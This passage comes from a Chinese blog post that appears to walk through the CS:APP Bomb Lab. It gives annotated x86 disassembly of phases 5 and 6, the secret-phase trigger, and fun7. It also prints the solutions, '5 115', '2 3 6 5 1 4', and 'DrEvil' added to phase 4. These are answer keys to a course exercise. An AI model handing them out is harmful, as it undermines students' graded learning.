class="line">   0x08048d98 &lt;+112&gt;:	add    $0x2c,%esp                        //栈帧释放空间</span><br><span class="line">   0x08048d9b &lt;+115&gt;:	ret                                      //返回地址出栈，且跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li><p>还是先看输入，还是两个整数<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501104814076.png" alt="image-20210501104814076"></p>
</li>
<li><p>过程：保存求和结果的<code>ecx</code>和发挥计数作用的<code>edx</code>都初始化为0<br><code>edx</code>加1，输入的<code>M(0x18+esp)</code>作为下标将<code>array[M(0x18+esp)]</code>存到<code>eax</code>，<code>ecx</code>加上<code>eax</code>也就是这个元素值<code>array[M(0x18+esp)]</code><br><code>edx</code>加1，将<code>eax</code>作为数组元素的下标将元素<code>array[eax]</code>存到<code>eax</code>，<code>ecx</code>加上这个元素值<code>eax</code>；<br>。。。这个过程持续到<code>eax</code>等于<code>0xf</code>就是当下标等于<code>0xf</code>时结束，同时<code>edx</code>等于<code>0xf</code>也就是这个过程刚好进行15次。</p>
<ul>
<li>我们查看这个数组<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501113814480.png" alt="image-20210501113814480"></li>
<li>发现<code>0xf</code>元素的下标为<code>6=0x6</code>，<br><code>0x6</code>元素的下标为<code>14=0xe</code>，<br><code>0xe</code>元素的下标为<code>2=0x2</code><br><code>0x2</code>元素的下表为<code>1=0x1</code>。。。。继续往下。。。。</li>
<li>我们得到的序列为：<code>f 6 e 2 1 a 0 8 4 9 d b 7 3 c 5 </code></li>
<li>所以第一个输入是<code>5</code></li>
</ul>
</li>
<li><p>第二个输入等于<code>%ecx</code>，因为只进行15次加法，所以最后和少了<code>array[15]=5</code>，所以是结果是<code>115</code></p>
</li>
<li><p>所以答案是<code>5 115</code>，验证，成功。<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501120859183.png" alt="image-20210501120859183"></p>
</li>
</ul>
<h4 id="phase-6："><a href="#phase-6：" class="headerlink" title="phase_6："></a><code>phase_6</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:               //phase_6(input)</span><br><span class="line">   0x08048d9c &lt;+0&gt;:	    push   %esi                        //esi入栈</span><br><span class="line">   0x08048d9d &lt;+1&gt;:	    push   %ebx                        //ebx入栈</span><br><span class="line">   0x08048d9e &lt;+2&gt;:	    sub    $0x44,%esp                  //栈帧预留0x44字节的空间</span><br><span class="line">   0x08048da1 &lt;+5&gt;:	    lea    0x10(%esp),%eax             //eax=0x10+esp</span><br><span class="line">   0x08048da5 &lt;+9&gt;:	    mov    %eax,0x4(%esp)              //M(0x4+esp)=eax=0x10+esp</span><br><span class="line">   0x08048da9 &lt;+13&gt;:	mov    0x50(%esp),%eax             //eax=M(0x50+esp)=input</span><br><span class="line">   0x08048dad &lt;+17&gt;:	mov    %eax,(%esp)                 //M(esp)=eax=input</span><br><span class="line">   0x08048db0 &lt;+20&gt;:	call   0x804922b &lt;read_six_numbers&gt;//调用read_six_numbers(input,0x10+esp)</span><br><span class="line">   0x08048db5 &lt;+25&gt;:	mov    $0x0,%esi                   //esi=0x0</span><br><span class="line">   0x08048dba &lt;+30&gt;:	mov    0x10(%esp,%esi,4),%eax      //eax=M(0x10+esp+4*esi)=array[esi]</span><br><span class="line">   0x08048dbe &lt;+34&gt;:	sub    $0x1,%eax                   //eax=eax-1=array[esi]-1</span><br><span class="line">   0x08048dc1 &lt;+37&gt;:	cmp    $0x5,%eax                   //compare eax=array[esi]-1 with 0x5</span><br><span class="line">   0x08048dc4 &lt;+40&gt;:	jbe    0x8048dcb &lt;phase_6+47&gt;      //if 0&lt;=eax&lt;=5, jump 0x8048dcb &lt;phase_6+47&gt;</span><br><span class="line">   0x08048dc6 &lt;+42&gt;:	call   0x80490f6 &lt;explode_bomb&gt;    //调用explode_bomb()</span><br><span class="line">   0x08048dcb &lt;+47&gt;:	add    $0x1,%esi                   //esi=esi+1</span><br><span class="line">   0x08048dce &lt;+50&gt;:	cmp    $0x6,%esi                   //compare esi with 0x6</span><br><span class="line">   0x08048dd1 &lt;+53&gt;:	je     0x8048dee &lt;phase_6+82&gt;      //if zf=1, jump 0x8048dee &lt;phase_6+82&gt;</span><br><span class="line">   0x08048dd3 &lt;+55&gt;:	mov    %esi,%ebx                   //ebx=esi</span><br><span class="line">   0x08048dd5 &lt;+57&gt;:	mov    0x10(%esp,%ebx,4),%eax      //eax=M(0x10+esp+ebx*4)=array[ebx]</span><br><span class="line">   0x08048dd9 &lt;+61&gt;:	cmp    %eax,0xc(%esp,%esi,4)   //compare M(0xc+esp+4*esi)=array[esi-1] with eax</span><br><span class="line">   0x08048ddd &lt;+65&gt;:	jne    0x8048de4 &lt;phase_6+72&gt;      //if zf=0, jump 0x8048de4 &lt;phase_6+72&gt;</span><br><span class="line">   0x08048ddf &lt;+67&gt;:	call   0x80490f6 &lt;explode_bomb&gt;    //调用explode_bomb()</span><br><span class="line">   0x08048de4 &lt;+72&gt;:	add    $0x1,%ebx                   //ebx=ebx+1</span><br><span class="line">   0x08048de7 &lt;+75&gt;:	cmp    $0x5,%ebx                   //compare ebx with 0x5</span><br><span class="line">   0x08048dea &lt;+78&gt;:	jle    0x8048dd5 &lt;phase_6+57&gt;      //if ebx&lt;=5,jump 0x8048dd5 &lt;phase_6+57&gt;</span><br><span class="line">   0x08048dec &lt;+80&gt;:	jmp    0x8048dba &lt;phase_6+30&gt;      //jump 0x8048dba &lt;phase_6+30&gt;</span><br><span class="line">   /*输入六个数到array[x]，每一个数都进行限制，必须与它之后数字不同，而且必须处于范围1-6 */</span><br><span class="line">   0x08048dee &lt;+82&gt;:	lea    0x10(%esp),%eax             //eax=0x10+esp</span><br><span class="line">   0x08048df2 &lt;+86&gt;:	lea    0x28(%esp),%ebx	           //ebx=0x28+esp=0x10+esp+0x4*6</span><br><span class="line">   0x08048df6 &lt;+90&gt;:	mov    $0x7,%ecx                   //ecx=0x7</span><br><span class="line">   0x08048dfb &lt;+95&gt;:	mov    %ecx,%edx                   //edx=ecx=0x7</span><br><span class="line">   0x08048dfd &lt;+97&gt;:	sub    (%eax),%edx                 //edx=edx-M(eax)=0x7-array[eax-(0x10+esp)]</span><br><span class="line">   0x08048dff &lt;+99&gt;:	mov    %edx,(%eax)                 //array[eax-(0x10+esp)]=M(eax)=edx</span><br><span class="line">   0x08048e01 &lt;+101&gt;:	add    $0x4,%eax                   //eax=eax+0x4</span><br><span class="line">   0x08048e04 &lt;+104&gt;:	cmp    %ebx,%eax                   //compare eax with ebx=0x10+esp+0x4*6</span><br><span class="line">   0x08048e06 &lt;+106&gt;:	jne    0x8048dfb &lt;phase_6+95&gt;      //if zf=0, jump 0x8048dfb &lt;phase_6+95&gt;</span><br><span class="line">   /*将这六个数组元素都分别被7减，所得结果还是存到他们原来的位置，也就是array[x]=7-array[x] */</span><br><span class="line">   0x08048e08 &lt;+108&gt;:	mov    $0x0,%ebx                   //ebx=0x0</span><br><span class="line">   0x08048e0d &lt;+113&gt;:	jmp    0x8048e25 &lt;phase_6+137&gt;     //jump 0x8048e25 &lt;phase_6+137&gt;</span><br><span class="line">   0x08048e0f &lt;+115&gt;:	mov    0x8(%edx),%edx              //edx=M(0x8+edx)</span><br><span class="line">   0x08048e12 &lt;+118&gt;:	add    $0x1,%eax                   //eax=eax+0x1</span><br><span class="line">   0x08048e15 &lt;+121&gt;:	cmp    %ecx,%eax                   //compare eax with ecx=array[ebx]</span><br><span class="line">   0x08048e17 &lt;+123&gt;:	jne    0x8048e0f &lt;phase_6+115&gt;     //if zf=0, jump 0x8048e0f &lt;phase_6+115&gt;</span><br><span class="line">   0x08048e19 &lt;+125&gt;:	mov    %edx,0x28(%esp,%esi,4)      //array[6+esi]=M(0x28+esp+4*esi)=edx</span><br><span class="line">   0x08048e1d &lt;+129&gt;:	add    $0x1,%ebx                   //ebx=ebx+0x1</span><br><span class="line">   0x08048e20 &lt;+132&gt;:	cmp    $0x6,%ebx                   //compare ebx with 0x6</span><br><span class="line">   0x08048e23 &lt;+135&gt;:	je     0x8048e3c &lt;phase_6+160&gt;     //if zf=1, jump 0x8048e3c &lt;phase_6+160&gt;</span><br><span class="line">   0x08048e25 &lt;+137&gt;:	mov    %ebx,%esi                   //esi=ebx</span><br><span class="line">   0x08048e27 &lt;+139&gt;:	mov    0x10(%esp,%ebx,4),%ecx      //ecx=M(0x10+esp+4*ebx)=array[ebx]</span><br><span class="line">   0x08048e2b &lt;+143&gt;:	mov    $0x1,%eax                   //eax=0x1</span><br><span class="line">   0x08048e30 &lt;+148&gt;:	mov    $0x804c13c,%edx             //edx=0x804c13c</span><br><span class="line">   0x08048e35 &lt;+153&gt;:	cmp    $0x1,%ecx                   //compare ecx=array[ebx] with 0x1</span><br><span class="line">   0x08048e38 &lt;+156&gt;:	jg     0x8048e0f &lt;phase_6+115&gt;     //if ecx&gt;0x1, jump 0x8048e0f &lt;phase_6+115&gt;</span><br><span class="line">   0x08048e3a &lt;+158&gt;:	jmp    0x8048e19 &lt;phase_6+125&gt;     //jump 0x8048e19 &lt;phase_6+125&gt;</span><br><span class="line">   /* 0&lt;=x&lt;=5，初始化edx=0x804c13c，循环array[x]-1次edx=M(edx+0x8)，最后edx存到array[x+6]中 */</span><br><span class="line">   0x08048e3c &lt;+160&gt;:	mov    0x28(%esp),%ebx             //ebx=M(0x28+esp)=array[6]</span><br><span class="line">   0x08048e40 &lt;+164&gt;:	mov    0x2c(%esp),%eax             //eax=M(0x2c+esp)=array[7]</span><br><span class="line">   0x08048e44 &lt;+168&gt;:	mov    %eax,0x8(%ebx)              //M(0x8+array[6])=M(0x8+ebx)=eax=array[7]</span><br><span class="line">   0x08048e47 &lt;+171&gt;:	mov    0x30(%esp),%edx             //edx=M(0x30+esp)=array[8]</span><br><span class="line">   0x08048e4b &lt;+175&gt;:	mov    %edx,0x8(%eax)              //M(0x8+array[7])=M(0x8+eax)=edx=array[8]</span><br><span class="line">   0x08048e4e &lt;+178&gt;:	mov    0x34(%esp),%eax             //eax=M(0x34+esp)=array[9]</span><br><span class="line">   0x08048e52 &lt;+182&gt;:	mov    %eax,0x8(%edx)              //M(0x8+array[8])=M(0x8+edx)=eax=array[9]</span><br><span class="line">   0x08048e55 &lt;+185&gt;:	mov    0x38(%esp),%edx             //edx=M(0x38+esp)=array[10]</span><br><span class="line">   0x08048e59 &lt;+189&gt;:	mov    %edx,0x8(%eax)              //M(0x8+array[9])=M(0x8+eax)=edx=array[10]</span><br><span class="line">   0x08048e5c &lt;+192&gt;:	mov    0x3c(%esp),%eax             //eax=M(0x3c+esp)=array[11]</span><br><span class="line">   0x08048e60 &lt;+196&gt;:	mov    %eax,0x8(%edx)              //M(0x8+array[10])=M(0x8+edx)=eax=array[11]</span><br><span class="line">   0x08048e63 &lt;+199&gt;:	movl   $0x0,0x8(%eax)              //M(0x8+array[11])=M(0x8+eax)=0x0</span><br><span class="line">   /* M(0x8+array[6+x])=array[6+x+1]，也就是对链表重新进行排序*/</span><br><span class="line">   0x08048e6a &lt;+206&gt;:	mov    $0x5,%esi                   //esi=0x5</span><br><span class="line">   0x08048e6f &lt;+211&gt;:	mov    0x8(%ebx),%eax              //eax=M(0x8+ebx)</span><br><span class="line">   0x08048e72 &lt;+214&gt;:	mov    (%eax),%edx                 //edx=M(eax)</span><br><span class="line">   0x08048e74 &lt;+216&gt;:	cmp    %edx,(%ebx)                 //compare M(ebx) with edx</span><br><span class="line">   0x08048e76 &lt;+218&gt;:	jge    0x8048e7d &lt;phase_6+225&gt;    //if M(ebx)&gt;=edx, jump 0x8048e7d &lt;phase_6+225&gt;</span><br><span class="line">   0x08048e78 &lt;+220&gt;:	call   0x80490f6 &lt;explode_bomb&gt;    //调用explode_bomb()</span><br><span class="line">   0x08048e7d &lt;+225&gt;:	mov    0x8(%ebx),%ebx              //ebx=M(0x8+ebx)</span><br><span class="line">   0x08048e80 &lt;+228&gt;:	sub    $0x1,%esi                   //esi=esi-1</span><br><span class="line">   0x08048e83 &lt;+231&gt;:	jne    0x8048e6f &lt;phase_6+211&gt;     //if zf=0, jump 0x8048e6f &lt;phase_6+211&gt;</span><br><span class="line">   /* 排序后的链表，前一个节点的值大于等于后一节点的值，*/</span><br><span class="line">   0x08048e85 &lt;+233&gt;:	add    $0x44,%esp                  //栈帧释放空间</span><br><span class="line">   0x08048e88 &lt;+236&gt;:	pop    %ebx                        //出栈ebx</span><br><span class="line">   0x08048e89 &lt;+237&gt;:	pop    %esi                        //出栈esi</span><br><span class="line">   0x08048e8a &lt;+238&gt;:	ret                                //返回地址出栈，跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li><p>打印查看<code>0x804c13c</code>地址所存，发现它是一个结构体，三个成员是：<code>value</code>、<code>id</code>、<code>next</code>。<br>依次查看各个节点。<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501183605731.png" alt="image-20210501183605731"></p>
</li>
<li><p>所以我们知道<code>array[x+6]</code>存的是<code>id=array[x]</code>的节点的地址；<br><code>M(array[x+6])</code>存的是<code>id=array[x]</code>的节点的<code>value</code>；<br><code>M(array[x+6]+8)</code>存的是<code>id=array[x]</code>的节点的<code>next</code>;</p>
</li>
<li><p>函数执行过程是：先输入<code>array[x]</code>并判断是否在<code>[1,6]</code>且各不相同；</p>
<p>对这六个元素都执行<code>array[x]=7-array[x]</code>；</p>
<p>将<code>id=array[x]</code>的节点地址存到<code>array[x+6]</code>；</p>
<p>将<code>id=array[x]</code>的节点的地址的<code>next</code>成员改写成<code>id=array[x+1]</code>的节点的地址，也就是<code>array[x+6]-&gt;next=array[x+6+1]</code>；</p>
<p>判断排序后的链表节点的<code>value</code>成员大小是否是递减的。</p>
</li>
<li><p>所以我们输入的数，其实是6个节点的<code>id</code>成员，函数按照输入<code>id</code>的顺序，将这六个节点排序，排序后的链表是递减的。</p>
</li>
<li><p>将这六个节点的<code>value</code>转化为10进制的数</p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
<th align="center">4</th>
<th align="center">5</th>
<th align="center">6</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>value</strong></td>
<td align="center">495</td>
<td align="center">476</td>
<td align="center">197</td>
<td align="center">612</td>
<td align="center">890</td>
<td align="center">249</td>
</tr>
</tbody></table>
</li>
<li><p>正确的<code>id</code>序列：<code>5 4 1 2 6 3</code></p>
</li>
<li><p>但是因为执行过<code>array[x]=7-array[x]</code>，所以正确的输入是：<code>2 3 6 5 1 4</code> </p>
</li>
<li><p>验证，输出提示语<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210502160922650.png" alt="image-20210502160922650"></p>
</li>
</ul>
<h4 id="phase-defused"><a href="#phase-defused" class="headerlink" title="phase_defused"></a><code>phase_defused</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_defused:    //phase_defused()</span><br><span class="line">   0x0804927b &lt;+0&gt;:	sub    $0x8c,%esp                 //栈帧预留0x8c字节的空间</span><br><span class="line">   0x08049281 &lt;+6&gt;:	mov    %gs:0x14,%eax              //eax=gs:0x14</span><br><span class="line">   0x08049287 &lt;+12&gt;:	mov    %eax,0x7c(%esp)        //M(0x7c+esp)=eax</span><br><span class="line">   0x0804928b &lt;+16&gt;:	xor    %eax,%eax              //eax=eax^eax</span><br><span class="line">   0x0804928d &lt;+18&gt;:	cmpl   $0x6,0x804c3cc         //compare M(0x804c3cc) with 0x6</span><br><span class="line">   //0x804c3cc &lt;num_input_strings&gt;:	0x00         记录关卡数</span><br><span class="line">   0x08049294 &lt;+25&gt;:	jne    0x8049308 &lt;phase_defused+141&gt;//if zf=0,jump 0x8049308 &lt;phase_defused+141&gt;</span><br><span class="line">   0x08049296 &lt;+27&gt;:	lea    0x2c(%esp),%eax        //eax=0x2c+esp</span><br><span class="line">   0x0804929a &lt;+31&gt;:	mov    %eax,0x10(%esp)        //M(0x10+esp)=eax</span><br><span class="line">   0x0804929e &lt;+35&gt;:	lea    0x28(%esp),%eax        //eax=0x28+esp</span><br><span class="line">   0x080492a2 &lt;+39&gt;:	mov    %eax,0xc(%esp)         //M(0xc+esp)=eax</span><br><span class="line">   0x080492a6 &lt;+43&gt;:	lea    0x24(%esp),%eax        //eax=0x24+esp</span><br><span class="line">   0x080492aa &lt;+47&gt;:	mov    %eax,0x8(%esp)         //M(0x8+esp)=eax</span><br><span class="line">   0x080492ae &lt;+51&gt;:	movl   $0x804a3e9,0x4(%esp)   //M(0x4+esp)=0x804a3e9</span><br><span class="line">   // 0x804a3e9:	 &quot;%d %d %s&quot;</span><br><span class="line">   0x080492b6 &lt;+59&gt;:	movl   $0x804c4d0,(%esp)      //M(esp)=0x804c4d0</span><br><span class="line">   // 0x804c4d0:	 &quot;&quot;             这个地址在某一关被赋值</span><br><span class="line">   0x080492bd &lt;+66&gt;:	call   0x8048870 &lt;__isoc99_sscanf@plt&gt; //__isoc99_sscanf@plt(0x804c4d0,0x804a3e9,0x24+esp,0x28+esp,0x2c+esp)</span><br><span class="line">   0x080492c2 &lt;+71&gt;:	cmp    $0x3,%eax              //compare 返回值eax with 0x3</span><br><span class="line">   0x080492c5 &lt;+74&gt;:	jne    0x80492fc &lt;phase_defused+129&gt;//if zf=0,jump 0x80492fc &lt;phase_defused+129&gt;</span><br><span class="line">   0x080492c7 &lt;+76&gt;:	movl   $0x804a3f2,0x4(%esp)   //M(0x4+esp)=0x804a3f2</span><br><span class="line">   // 0x804a3f2:	 &quot;DrEvil&quot;</span><br><span class="line">   0x080492cf &lt;+84&gt;:	lea    0x2c(%esp),%eax         //eax=0x2c+esp</span><br><span class="line">   0x080492d3 &lt;+88&gt;:	mov    %eax,(%esp)             //M(esp)=eax</span><br><span class="line">   0x080492d6 &lt;+91&gt;:	call   0x8048fe4 &lt;strings_not_equal&gt; //调用strings_not_equal(0x2c+esp,0x804a3f2)</span><br><span class="line">   0x080492db &lt;+96&gt;:	test   %eax,%eax                //eax&amp;eax</span><br><span class="line">   0x080492dd &lt;+98&gt;:	jne    0x80492fc &lt;phase_defused+129&gt;//if zf=0,jump 0x80492fc &lt;phase_defused+129&gt;</span><br><span class="line">   0x080492df &lt;+100&gt;:	movl   $0x804a2b8,(%esp)        //M(esp)=0x804a2b8</span><br><span class="line">   //0x804a2b8:	 &quot;Curses, you&#x27;ve found the secret phase!&quot;</span><br><span class="line">   0x080492e6 &lt;+107&gt;:	call   0x8048800 &lt;puts@plt&gt;     //调用puts@plt(0x804a2b8)</span><br><span class="line">   0x080492eb &lt;+112&gt;:	movl   $0x804a2e0,(%esp)        //M(esp)=0x804a2e0</span><br><span class="line">   //0x804a2e0:	 &quot;But finding it and solving it are quite different...&quot;</span><br><span class="line">   0x080492f2 &lt;+119&gt;:	call   0x8048800 &lt;puts@plt&gt;     //调用puts@plt(0x804a2e0)</span><br><span class="line">   0x080492f7 &lt;+124&gt;:	call   0x8048edc &lt;secret_phase&gt;  //进入隐藏关卡</span><br><span class="line">   0x080492fc &lt;+129&gt;:	movl   $0x804a318,(%esp)         //M(esp)=0x804a318</span><br><span class="line">   //0x804a318:	 &quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span><br><span class="line">   0x08049303 &lt;+136&gt;:	call   0x8048800 &lt;puts@plt&gt;     //调用puts@plt(0x804a318)</span><br><span class="line">   0x08049308 &lt;+141&gt;:	mov    0x7c(%esp),%eax          //eax=M(0x7c+esp)</span><br><span class="line">   0x0804930c &lt;+145&gt;:	xor    %gs:0x14,%eax            //eax ^ %gs:0x14</span><br><span class="line">   0x08049313 &lt;+152&gt;:	je     0x804931a &lt;phase_defused+159&gt;//if zf=1,jump 0x804931a &lt;phase_defused+159&gt;</span><br><span class="line">   0x08049315 &lt;+154&gt;:	call   0x80487d0 &lt;__stack_chk_fail@plt&gt; //调用__stack_chk_fail@plt()</span><br><span class="line">   0x0804931a &lt;+159&gt;:	add    $0x8c,%esp                //栈帧释放空间</span><br><span class="line">   0x08049320 &lt;+165&gt;:	ret                              //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li>查看一下炸弹拆除函数汇编代码，发现<code>0x080492f7 &lt;+124&gt;:    call   0x8048edc &lt;secret_phase&gt;</code>隐藏关卡</li>
<li>只有在第六关之后，而且<code>0x2c+esp</code>地址的字符串等于内置的<code>DrEvil</code>，我们才能进入隐藏关卡<ul>
<li>但是<code>0x804c4d0</code>什么时候被赋值的呢，我们进行调试，调试发现它是在第四关被赋值的，所以我们要将<code>DrEvil</code>放在第四关<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210503173426765.png" alt="image-20210503173426765"></li>
<li>放进之后我们成功触发了隐藏关<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210503173643070.png" alt="image-20210503173643070"></li>
</ul>
</li>
</ul>
<h5 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a><code>secret_phase</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function secret_phase:     //secret_phase()</span><br><span class="line">   0x08048edc &lt;+0&gt;:	push   %ebx                       //push ebx</span><br><span class="line">   0x08048edd &lt;+1&gt;:	    sub    $0x18,%esp             //栈帧预留0x18字节</span><br><span class="line">   0x08048ee0 &lt;+4&gt;:	    call   0x804911d &lt;read_line&gt;  //调用read_line()</span><br><span class="line">   0x08048ee5 &lt;+9&gt;:	    movl   $0xa,0x8(%esp)         //M(0x8+esp)=0xa</span><br><span class="line">   0x08048eed &lt;+17&gt;:	movl   $0x0,0x4(%esp)         //M(0x4+esp)=0x0</span><br><span class="line">   0x08048ef5 &lt;+25&gt;:	mov    %eax,(%esp)            //M(esp)=eax=input</span><br><span class="line">   0x08048ef8 &lt;+28&gt;:	call   0x80488e0 &lt;strtol@plt&gt;//调用strtol@plt(input,0x0,0xa)返回值为字符串转化的整数</span><br><span class="line">   0x08048efd &lt;+33&gt;:	mov    %eax,%ebx              //ebx=eax=input</span><br><span class="line">   0x08048eff &lt;+35&gt;:	lea    -0x1(%eax),%eax        //eax=-0x1+eax</span><br><span class="line">   0x08048f02 &lt;+38&gt;:	cmp    $0x3e8,%eax            //compare eax with 0x3e8=1000</span><br><span class="line">   0x08048f07 &lt;+43&gt;:	jbe    0x8048f0e &lt;secret_phase+50&gt;//if 0&lt;=eax&lt;=1000,jump 0x8048f0e &lt;secret_phase+50&gt;</span><br><span class="line">   0x08048f09 &lt;+45&gt;:	call   0x80490f6 &lt;explode_bomb&gt;//调用explode_bomb()</span><br><span class="line">   0x08048f0e &lt;+50&gt;:	mov    %ebx,0x4(%esp)         //M(0x4+esp)=ebx</span><br><span class="line">   0x08048f12 &lt;+54&gt;:	movl   $0x804c088,(%esp)      //M(esp)=0x804c088</span><br><span class="line">   // 0x804c088:	0x24</span><br><span class="line">   0x08048f19 &lt;+61&gt;:	call   0x8048e8b &lt;fun7&gt;       //调用fun7(0x804c088,ebx)</span><br><span class="line">   0x08048f1e &lt;+66&gt;:	cmp    $0x5,%eax              //compare eax with 0x5</span><br><span class="line">   0x08048f21 &lt;+69&gt;:	je     0x8048f28 &lt;secret_phase+76&gt;  //if zf=1, jump 0x8048f28 &lt;secret_phase+76&gt;</span><br><span class="line">   0x08048f23 &lt;+71&gt;:	call   0x80490f6 &lt;explode_bomb&gt; //调用explode_bomb()</span><br><span class="line">   0x08048f28 &lt;+76&gt;:	movl   $0x804a1e8,(%esp)       //M(esp)=0x804a1e8</span><br><span class="line">   // 0x804a1e8:	 &quot;Wow! You&#x27;ve defused the secret stage!&quot;</span><br><span class="line">   0x08048f2f &lt;+83&gt;:	call   0x8048800 &lt;puts@plt&gt;    //调用puts@plt(0x804a1e8)</span><br><span class="line">   0x08048f34 &lt;+88&gt;:	call   0x804927b &lt;phase_defused&gt; //调用phase_defused()</span><br><span class="line">   0x08048f39 &lt;+93&gt;:	add    $0x18,%esp              //栈帧释放空间</span><br><span class="line">   0x08048f3c &lt;+96&gt;:	pop    %ebx                    //出栈ebx</span><br><span class="line">   0x08048f3d &lt;+97&gt;:	ret                            //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>&lt;fun7&gt;</code>的返回值<code>%eax</code>如果等于5我们就能成功拆除炸弹</li>
<li>查看<code>fun7</code>函数</li>
</ul>
<h5 id="fun7"><a href="#fun7" class="headerlink" title="fun7"></a><code>fun7</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function fun7:             //fun7(address,number)</span><br><span class="line">   0x08048e8b &lt;+0&gt;:	push   %ebx                       //ebx入栈</span><br><span class="line">   0x08048e8c &lt;+1&gt;:	sub    $0x18,%esp                 //栈帧预留0x18字节的空间</span><br><span class="line">   0x08048e8f &lt;+4&gt;:	    mov    0x20(%esp),%edx        //edx=M(0x20+esp)=address</span><br><span class="line">   0x08048e93 &lt;+8&gt;:	    mov    0x24(%esp),%ecx        //ecx=M(0x24+esp)=number</span><br><span class="line">   0x08048e97 &lt;+12&gt;:	test   %edx,%edx              //edx &amp; edx</span><br><span class="line">   0x08048e99 &lt;+14&gt;:	je     0x8048ed2 &lt;fun7+71&gt;    //if zf=1, jump 0x8048ed2 &lt;fun7+71&gt;</span><br><span class="line">   0x08048e9b &lt;+16&gt;:	mov    (%edx),%ebx            //ebx=M(edx)=*address</span><br><span class="line">   0x08048e9d &lt;+18&gt;:	cmp    %ecx,%ebx              //compare ebx with ecx=number</span><br><span class="line">   0x08048e9f &lt;+20&gt;:	jle    0x8048eb4 &lt;fun7+41&gt;    //if ebx&lt;=ecx=number, jump 0x8048eb4 &lt;fun7+41&gt;</span><br><span class="line">   0x08048ea1 &lt;+22&gt;:	mov    %ecx,0x4(%esp)         //M(0x4+esp)=ecx=number</span><br><span class="line">   0x08048ea5 &lt;+26&gt;:	mov    0x4(%edx),%eax         //eax=M(0x4+edx)=*(address+4)</span><br><span class="line">   0x08048ea8 &lt;+29&gt;:	mov    %eax,(%esp)            //M(esp)=eax=*(address+4)</span><br><span class="line">   0x08048eab &lt;+32&gt;:	call   0x8048e8b &lt;fun7&gt;       //fun7(*(address+4),number)</span><br><span class="line">   0x08048eb0 &lt;+37&gt;:	add    %eax,%eax              //eax=eax+eax</span><br><span class="line">   0x08048eb2 &lt;+39&gt;:	jmp    0x8048ed7 &lt;fun7+76&gt;    //jump 0x8048ed7 &lt;fun7+76&gt;</span><br><span class="line">   0x08048eb4 &lt;+41&gt;:	mov    $0x0,%eax              //eax=0x0</span><br><span class="line">   0x08048eb9 &lt;+46&gt;:	cmp    %ecx,%ebx              //compare ebx=*address with ecx=number</span><br><span class="line">   0x08048ebb &lt;+48&gt;:	je     0x8048ed7 &lt;fun7+76&gt;    //if zf=1, jump 0x8048ed7 &lt;fun7+76&gt;</span><br><span class="line">   0x08048ebd &lt;+50&gt;:	mov    %ecx,0x4(%esp)         //M(0x4+esp)=ecx=number</span><br><span class="line">   0x08048ec1 &lt;+54&gt;:	mov    0x8(%edx),%eax         //eax=M(0x8+edx)=*(address+8)</span><br><span class="line">   0x08048ec4 &lt;+57&gt;:	mov    %eax,(%esp)            //M(esp)=eax=*(address+8)</span><br><span class="line">   0x08048ec7 &lt;+60&gt;:	call   0x8048e8b &lt;fun7&gt;       //调用fun7(*(address+8),number)</span><br><span class="line">   0x08048ecc &lt;+65&gt;:	lea    0x1(%eax,%eax,1),%eax  //eax=0x1+eax+eax</span><br><span class="line">   0x08048ed0 &lt;+69&gt;:	jmp    0x8048ed7 &lt;fun7+76&gt;    //jump 0x8048ed7 &lt;fun7+76&gt;</span><br><span class="line">   0x08048ed2 &lt;+71&gt;:	mov    $0xffffffff,%eax       //返回值eax=-1</span><br><span class="line">   0x08048ed7 &lt;+76&gt;:	add    $0x18,%esp             //栈帧释放空间</span><br><span class="line">   0x08048eda &lt;+79&gt;:	pop    %ebx                   //出栈ebx</span><br><span class="line">   0x08048edb &lt;+80&gt;:	ret                           //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li><p>我们将<code>fun7</code>翻译成c语言函数</p>
